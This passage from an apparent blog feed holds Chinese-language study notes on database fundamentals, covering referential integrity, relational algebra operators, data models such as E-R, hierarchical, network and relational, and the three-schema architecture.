外码：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码 Ks 相对应，则称 F 是基本关系 R 的外码。&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;基本关系R称为参照关系
基本关系S称为被参照关系或目标关系&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;参照完整性规则&lt;br /&gt;
若属性（或属性组）F 是基本关系 R 的外码，它与基本关系 S 的主码 Ks 相对应（基本关系 R 和 S 不一定是不同的关系），则对于 R 中每个元组在 F 上的值必须为：&lt;br /&gt;
或者取空值（F 的每个属性值均为空值）&lt;br /&gt;
或者等于 S 中某个元组的主码值&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;234-用户定义的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#234-用户定义的完整性&#34;&gt;#&lt;/a&gt; 2.3.4 用户定义的完整性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求&lt;/li&gt;
&lt;li&gt;关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;24关系代数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24关系代数&#34;&gt;#&lt;/a&gt; 2.4 关系代数&lt;/h2&gt;
&lt;p&gt;关系代数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一种抽象的查询语言&lt;/li&gt;
&lt;li&gt;用对关系的运算来表达查询&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系代数的三个要素&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运算对象：关系&lt;/li&gt;
&lt;li&gt;运算结果：关系&lt;/li&gt;
&lt;li&gt;运算符：4 类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;集合运算符（）&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923174757666&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将关系看成元组的集合&lt;/li&gt;
&lt;li&gt;运算是从关系的 “水平” 方向即行的角度来进行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;专门的关系运算符 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923175007786&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不仅涉及行而且涉及列&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系代数运算的分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;传统的集合运算&lt;/p&gt;
&lt;p&gt;并、差、交、广义笛卡尔积&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;专门的关系运算&lt;/p&gt;
&lt;p&gt;选择、投影、连接、除&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</id>
        <title>数据库系统概述</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&#34;11数据库系统概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11数据库系统概述&#34;&gt;#&lt;/a&gt; 1.1 数据库系统概述&lt;/h1&gt;
&lt;h2 id=&#34;111四个基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#111四个基本概念&#34;&gt;#&lt;/a&gt; 1.1.1 四个基本概念&lt;/h2&gt;
&lt;h3 id=&#34;数据data选择填空&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据data选择填空&#34;&gt;#&lt;/a&gt; 数据（data）（选择填空）&lt;/h3&gt;
&lt;p&gt;数据是数据库中存储的基本对象&lt;/p&gt;
&lt;p&gt;定义：数据是描述事物的符号记录&lt;/p&gt;
&lt;p&gt;数据的种类有文本，图形，图像，音频，视频，学生的档案记录，货物的运输情况&lt;/p&gt;
&lt;p&gt;数据的特点：数据与语义是密不可分的（数据的含义称为数据的语义）&lt;/p&gt;
&lt;p&gt;数据是现象，而信息反应实质&lt;/p&gt;
&lt;h3 id=&#34;数据库database&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库database&#34;&gt;#&lt;/a&gt; 数据库（database）&lt;/h3&gt;
&lt;p&gt;定义：数据库是长期储存在计算机内，有组织的、可共享的大量数据的集合&lt;/p&gt;
&lt;p&gt;数据库的基本特征有&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据按照一定的数据模型组织、描述和储存&lt;/li&gt;
&lt;li&gt;可为各种用户共享&lt;/li&gt;
&lt;li&gt;冗余度较小&lt;/li&gt;
&lt;li&gt;数据独立性较高&lt;/li&gt;
&lt;li&gt;易扩展&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据库管理系统dbmsdatabase-management-system&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库管理系统dbmsdatabase-management-system&#34;&gt;#&lt;/a&gt; 数据库管理系统（DBMS）Database Management System&lt;/h3&gt;
&lt;p&gt;定义：位于用户余操作系统之间的一程数据管理软件&lt;br /&gt;
是基础软件，一个大型复杂的软件系统&lt;/p&gt;
&lt;p&gt;作用：科学地组织和储存数据、高效的维护和获取数据&lt;/p&gt;
&lt;p&gt;主要功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据定义功能：DDL&lt;/li&gt;
&lt;li&gt;数据组织、储存和管理&lt;/li&gt;
&lt;li&gt;数据操纵功能：DML&lt;/li&gt;
&lt;li&gt;数据库的事物管理和运行管理&lt;/li&gt;
&lt;li&gt;数据库的建立运行管理&lt;/li&gt;
&lt;li&gt;数据库的建立和维护功能&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常见的 DBMS&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;关系型数据库
1. MySQL数据库
2. Microsoft SQL Server数据库
3. Oracle数据库
4. Postgresql数据库
5. Sybase数据库
6. DB2数据库
7. Access数据库
非关系型数据库
1. Mongodb数据库
2. Redis数据库
3. Hbase数据库
4. Memcaced数据库&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905094000162.png&#34; alt=&#34;image-20220905094000162&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据库系统dbs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库系统dbs&#34;&gt;#&lt;/a&gt; 数据库系统（DBS）&lt;/h3&gt;
&lt;p&gt;定义：数据库系统是由数据库，数据库管理系统（及其应用开方工具）、应用程序和数据库管理员（DBA）组成的储存、管理、处理和维护数据的系统&lt;/p&gt;
&lt;p&gt;构成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据库&lt;/li&gt;
&lt;li&gt;数据库管理系统（及其开发工具）&lt;/li&gt;
&lt;li&gt;应用系统&lt;/li&gt;
&lt;li&gt;数据库管理员&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;112数据库管理技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#112数据库管理技术&#34;&gt;#&lt;/a&gt; 1.1.2 数据库管理技术&lt;/h2&gt;
&lt;p&gt;数据管理定义：对数据进行・分类、组织、编码、存储检索和维护&lt;br /&gt;
数据处理的中心问题&lt;/p&gt;
&lt;p&gt;数据管理技术的三个阶段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;人工管理阶段&lt;/li&gt;
&lt;li&gt;文件系统阶段&lt;/li&gt;
&lt;li&gt;数据库系统阶段&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;113数据系统的特点选择填空&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#113数据系统的特点选择填空&#34;&gt;#&lt;/a&gt; 1.1.3 数据系统的特点（选择填空）&lt;/h2&gt;
&lt;h3 id=&#34;数据结构化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据结构化&#34;&gt;#&lt;/a&gt; 数据结构化&lt;/h3&gt;
&lt;p&gt;整体结构化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不在仅仅针对某一个应用，而是面向整个组织或者企业&lt;/li&gt;
&lt;li&gt;不仅数据内部结构化，整体是结构化的，数据之间具有联系&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实现数据的真正结构化&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据的结构用数据模型描述，无需程序定义和解释&lt;/li&gt;
&lt;li&gt;数据可以变长&lt;/li&gt;
&lt;li&gt;数据的最小获取单位是数据项&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据的共享性高冗余度低易扩展&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据的共享性高冗余度低易扩展&#34;&gt;#&lt;/a&gt; 数据的共享性高，冗余度低，易扩展&lt;/h3&gt;
&lt;p&gt;数据库系统从整体角度看待和描述数据，数据面向整个系统，可以被多个用户多个应用共享使用&lt;/p&gt;
&lt;p&gt;数据共享的好处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;减少数据冗余，节约储存空间&lt;/li&gt;
&lt;li&gt;避免数据之间的不相容性与不一致性&lt;/li&gt;
&lt;li&gt;使系统易于扩充&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据独立性高&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据独立性高&#34;&gt;#&lt;/a&gt; 数据独立性高&lt;/h3&gt;
&lt;p&gt;物理独立性：指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。当数据的物理存储改变了，应用程序不用改变。&lt;/p&gt;
&lt;p&gt;逻辑独立性：指用户的应用程序与数据库的逻辑结构是相互独立的。数据的逻辑结构改变了，用户程序也可以不变。&lt;/p&gt;
&lt;h3 id=&#34;数据由dbms统一管理和控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据由dbms统一管理和控制&#34;&gt;#&lt;/a&gt; 数据由 DBMS 统一管理和控制&lt;/h3&gt;
&lt;p&gt;DBMS 提供的数据控制功能&lt;/p&gt;
&lt;p&gt;(1) 数据的安全性（Security）保护 保护数据，以防止不合法的使用造成的数据的泄密和破坏。&lt;/p&gt;
&lt;p&gt;(2) 数据的完整性（Integrity）检查 将数据控制在有效的范围内，或保证数据之间满足一定的关系。&lt;/p&gt;
&lt;p&gt;(3) 并发（Concurrency）控制 对多用户的并发操作加以控制和协调，防止相互干扰而得到错误的结果。&lt;/p&gt;
&lt;p&gt;(4) 数据库恢复（Recovery） 将数据库从错误状态恢复到某一已知的正确状态。&lt;/p&gt;
&lt;h1 id=&#34;12数据模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12数据模型&#34;&gt;#&lt;/a&gt; 1.2 数据模型&lt;/h1&gt;
&lt;p&gt;在数据库中用数据模型这个工具来抽象、表示和处理现实世界中的数据和信息。&lt;br /&gt;
通俗地讲数据模型就是现实世界的模拟。&lt;/p&gt;
&lt;p&gt;数据模型应满足三方面要求&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能比较真实地模拟现实世界&lt;/li&gt;
&lt;li&gt;容易为人所理解&lt;/li&gt;
&lt;li&gt;便于在计算机上实现&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：数据模型是数据库系统的核心和基础&lt;/p&gt;
&lt;h2 id=&#34;121两大类数据模型了解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#121两大类数据模型了解&#34;&gt;#&lt;/a&gt; 1.2.1 两大类数据模型（了解）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;概念模型&lt;br /&gt;
也称信息模型，它是按用户的观点来对信息和信息建模，用于数据库设计&lt;/li&gt;
&lt;li&gt;逻辑模型：主要包括网状模型、层次模型、关系模型、面向对象模型等，按计算机系统的观点对数据建模，用于 DBMS 实现。&lt;br /&gt;
物理模型：是对数据最底层的抽象，描述数据在系统内部的表示方式和存取方法，在磁盘或磁带上的存储方式和存取方法。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;122概念模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#122概念模型&#34;&gt;#&lt;/a&gt; 1.2.2 概念模型&lt;/h2&gt;
&lt;p&gt;概念模型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念模型用于信息世界的建模&lt;/li&gt;
&lt;li&gt;是现实世界到机器世界的一个中间层次&lt;/li&gt;
&lt;li&gt;是数据库设计的有力工具 数据库设计人员和用户之间进行交流的语言&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对概念模型的基本要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;较强的语义表达能力&lt;/li&gt;
&lt;li&gt;能够方便、直接地表达应用中的各种语义知识&lt;/li&gt;
&lt;li&gt;简单、清晰、易于用户理解&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;信息世界中的基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息世界中的基本概念&#34;&gt;#&lt;/a&gt; 信息世界中的基本概念&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;实体（Entity）  客观存在并可相互区别的事物称为实体。 可以是具体的人、事、物或抽象的概念。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;属性（Attribute）  实体所具有的某一特性称为属性。 一个实体可以由若干个属性来刻画。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;码（Key）  唯一标识实体的属性集称为码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;域（Domain）  属性的取值范围称为该属性的域。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实体型（Entity Type）  用实体名及其属性名集合来抽象和刻画同类实体称为实体型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实体集（Entity Set）  同一类型实体的集合称为实体集&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;联系（Relationship）   现实世界中事物内部以及事物之间的联系在信息世界中反映为实体内部的联系和实体之间的联系。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;实体内部&lt;/code&gt; 的联系通常是指组成实体的各属性之间的联系&lt;/p&gt;
&lt;p&gt;&lt;code&gt;实体之间&lt;/code&gt; 的联系通常是指不同实体集之间的联系&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;概念模型的一种表示方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念模型的一种表示方法&#34;&gt;#&lt;/a&gt; 概念模型的一种表示方法&lt;/h3&gt;
&lt;p&gt;概念模型的表示方法 —E-R 图、&lt;strong&gt;实体－联系方法&lt;/strong&gt; (E-R 方法)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用 E-R 图来描述现实世界的概念模型&lt;/li&gt;
&lt;li&gt;E-R 方法也称为 E-R 模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112912981.png&#34; alt=&#34;image-20220905112912981&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112937613.png&#34; alt=&#34;image-20220905112937613&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;123数据模型的组成要素三个&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#123数据模型的组成要素三个&#34;&gt;#&lt;/a&gt; 1.2.3 数据模型的组成要素（三个）&lt;/h2&gt;
&lt;h3 id=&#34;数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据结构&#34;&gt;#&lt;/a&gt; 数据结构&lt;/h3&gt;
&lt;p&gt;数据结构描述数据库的组成对象，以及对象之间的联系&lt;/p&gt;
&lt;p&gt;对系统静态的描述&lt;/p&gt;
&lt;h3 id=&#34;数据操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据操作&#34;&gt;#&lt;/a&gt; 数据操作&lt;/h3&gt;
&lt;p&gt;对数据库中的对象的实例（值）允许执行的操作以及相关的操作规则，对系统动态的描述&lt;/p&gt;
&lt;h3 id=&#34;完整性约束条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#完整性约束条件&#34;&gt;#&lt;/a&gt; 完整性约束条件&lt;/h3&gt;
&lt;p&gt;一组完整性规则的集合。&lt;/p&gt;
&lt;p&gt;完整性规则：给定的数据模型中数据及其联系所具有的制约和储存规则&lt;/p&gt;
&lt;p&gt;用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确、有效、相容。&lt;/p&gt;
&lt;h2 id=&#34;124最常用的数据模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#124最常用的数据模型&#34;&gt;#&lt;/a&gt; 1.2.4 最常用的数据模型&lt;/h2&gt;
&lt;p&gt;非关系模型&lt;/p&gt;
&lt;p&gt;层次模型 (Hierarchical Model) 网状模型 (Network Model)&lt;/p&gt;
&lt;p&gt;关系模型 (Relational Model)   面向对象模型 (Object Oriented Model）&lt;br /&gt;
对象关系模型 (Object Relational Model)&lt;/p&gt;
&lt;p&gt;基本层次联系是指两个记录以及它们之间的一对多（包括一对一）的联系&lt;/p&gt;
&lt;h2 id=&#34;125层次模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#125层次模型&#34;&gt;#&lt;/a&gt; 1.2.5 层次模型&lt;/h2&gt;
&lt;h3 id=&#34;1-层次模型的数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-层次模型的数据结构&#34;&gt;#&lt;/a&gt; 1、层次模型的数据结构&lt;/h3&gt;
&lt;p&gt;在数据库中定义满足下面两个条件的基本层次联系的集合为层次模型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有且只有一个节点没有双亲结点，这个结点被称为根结点&lt;/li&gt;
&lt;li&gt;根以外的其他结点有且只有一个双亲结点&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每个结点表示一个记录类型，记录类型之间的联系用结点之间的连线表示，这种联系是父子之间的一对多的关系&lt;/p&gt;
&lt;h3 id=&#34;2-层次模型的数据操纵与完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-层次模型的数据操纵与完整性约束&#34;&gt;#&lt;/a&gt; 2、层次模型的数据操纵与完整性约束&lt;/h3&gt;
&lt;p&gt;层次模型的数据操纵主要有查询、插入、删除和更新，操纵时要保证层次模型完整性约束条件&lt;/p&gt;
&lt;h3 id=&#34;3-层次模型的优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-层次模型的优缺点&#34;&gt;#&lt;/a&gt; 3、层次模型的优缺点&lt;/h3&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;层次模型的数据结构比较简单清晰&lt;/li&gt;
&lt;li&gt;层次数据库的查询效率高&lt;/li&gt;
&lt;li&gt;层次数据模型提供了良好的完整性支撑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;现实世界中很多联系是非层次性的，如结点之间具有多对多联系，不适合层次模型表示&lt;/li&gt;
&lt;li&gt;如果一个结点具有多个双亲结点编写很复杂&lt;/li&gt;
&lt;li&gt;查询子女结点必须通过双亲结点&lt;/li&gt;
&lt;li&gt;由于结构严密，层次命令趋于程序化&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;126网状模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#126网状模型&#34;&gt;#&lt;/a&gt; 1.2.6 网状模型&lt;/h2&gt;
&lt;h3 id=&#34;1-网状模型的数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-网状模型的数据结构&#34;&gt;#&lt;/a&gt; 1、网状模型的数据结构&lt;/h3&gt;
&lt;p&gt;在数据库中满足下面两个条件的基本层次联系集合称为网状模型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;允许一个以上的结点无双亲&lt;/li&gt;
&lt;li&gt;一个结点可以有对于一个的双亲&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-网状模型的数据操纵与完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-网状模型的数据操纵与完整性约束&#34;&gt;#&lt;/a&gt; 2、网状模型的数据操纵与完整性约束&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;支持记录码的概念，码即唯一标识记录的数据项的集合&lt;/li&gt;
&lt;li&gt;保证一个联系中双亲记录和子女记录之间是一对多的关系&lt;/li&gt;
&lt;li&gt;可以支持双亲和子女记录之间&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3-网状模型的优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-网状模型的优缺点&#34;&gt;#&lt;/a&gt; 3、网状模型的优缺点&lt;/h3&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能够更为直接的描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系&lt;/li&gt;
&lt;li&gt;具有良好的性能，存取效率较高&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;结构比较复杂，而且伴随着应环境的扩大，数据库的结构就变得越来越复杂&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;127关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#127关系模型&#34;&gt;#&lt;/a&gt; 1.2.7 关系模型&lt;/h2&gt;
&lt;p&gt;关系数据库系统采用关系模型作为数据的组织方式&lt;/p&gt;
&lt;h3 id=&#34;1-关系数据模型的数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-关系数据模型的数据结构&#34;&gt;#&lt;/a&gt; 1、关系数据模型的数据结构&lt;/h3&gt;
&lt;p&gt;在用户观点下，关系模型中数据的逻辑结构是一张二维表，它由行和列组成。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系（Relation） 一个关系对应通常说的一张表&lt;/li&gt;
&lt;li&gt;元组（Tuple） 表中的一行即为一个元组&lt;/li&gt;
&lt;li&gt;属性（Attribute）   表中的一列即为一个属性，给每一个属性起一个名称即属性名&lt;/li&gt;
&lt;li&gt;主码（Key） 表中的某个属性组，它可以唯一确定一个元组。&lt;/li&gt;
&lt;li&gt;域（Domain） 属性的取值范围。&lt;/li&gt;
&lt;li&gt;分量 元组中的一个属性值。&lt;/li&gt;
&lt;li&gt;关系模式 对关系的描述&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系必须是规范化的，满足一定的规范条件&lt;br /&gt;
最基本的规范条件：关系的每一个分量必须是一个不可分的数据项，不允许表中还有表&lt;/p&gt;
&lt;h3 id=&#34;2-关系数据模型的操纵与完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-关系数据模型的操纵与完整性约束&#34;&gt;#&lt;/a&gt; 2、关系数据模型的操纵与完整性约束&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;数据操作是集合操作，操作对象和操作结果都是关系&lt;/li&gt;
&lt;li&gt;数据操作是集合操作，操作对象和操作结果都是关系，即若干元组的集合&lt;/li&gt;
&lt;li&gt;存取路径对用户透明 / 隐蔽，用户只要指出 “干什么”，不必详细说明 “怎么干”&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-关系数据模型的优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-关系数据模型的优缺点&#34;&gt;#&lt;/a&gt; 3、关系数据模型的优缺点&lt;/h3&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;建立在严格的数学概念的基础上&lt;/li&gt;
&lt;li&gt;概念单一&lt;br /&gt;
实体和各类联系都用关系来表示&lt;br /&gt;
对数据的检索结果也是关系&lt;/li&gt;
&lt;li&gt;关系模型的存取路径对用户透明&lt;br /&gt;
具有更高的数据独立性，更好的安全保密性&lt;br /&gt;
简化了程序员的工作和数据库开发建立的工作&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;存取路径对用户透明导致查询效率往往不如非关系数据模型&lt;/li&gt;
&lt;li&gt;为提高性能，必须对用户的查询请求进行优化    增加了开发 DBMS 的难度&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;13数据库系统结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13数据库系统结构&#34;&gt;#&lt;/a&gt; 1.3 数据库系统结构&lt;/h1&gt;
&lt;h3 id=&#34;131数据库系统模式的概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#131数据库系统模式的概念&#34;&gt;#&lt;/a&gt; 1.3.1 数据库系统模式的概念&lt;/h3&gt;
&lt;h4 id=&#34;模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模式&#34;&gt;#&lt;/a&gt; 模式&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;数据库全体数据逻辑结构和特征的描述&lt;/li&gt;
&lt;li&gt;是型的描述&lt;/li&gt;
&lt;li&gt;反映的是数据的结构及其联系&lt;/li&gt;
&lt;li&gt;模式是相对稳定的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;型是对一类型的结构和属性的说明&lt;br /&gt;
值是型的一个具体赋值&lt;/p&gt;
&lt;h3 id=&#34;132数据库系统的三级映像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#132数据库系统的三级映像&#34;&gt;#&lt;/a&gt; 1.3.2 数据库系统的三级映像&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914203111627.png&#34; alt=&#34;image-20220914203111627&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-模式&#34;&gt;#&lt;/a&gt; 1、模式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;模式也叫逻辑结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库中全体数据的逻辑结构和特征的描述&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;所有用户的公共数据视图，综合了所有用户的需求&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个数据库只有一个模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模式的地位：是数据库系统模式结构的中间层&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;与数据的物理存储细节和硬件环境无关&lt;/li&gt;
&lt;li&gt;与具体的应用程序、开发工具及高级程序设计语言无关&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;逻辑结构：数据记录由哪些数据项组成，数据项的名字，类型，取值范围等，而且要定义数据之间的联系，与数据有关的安全性，完整性操作。&lt;/p&gt;
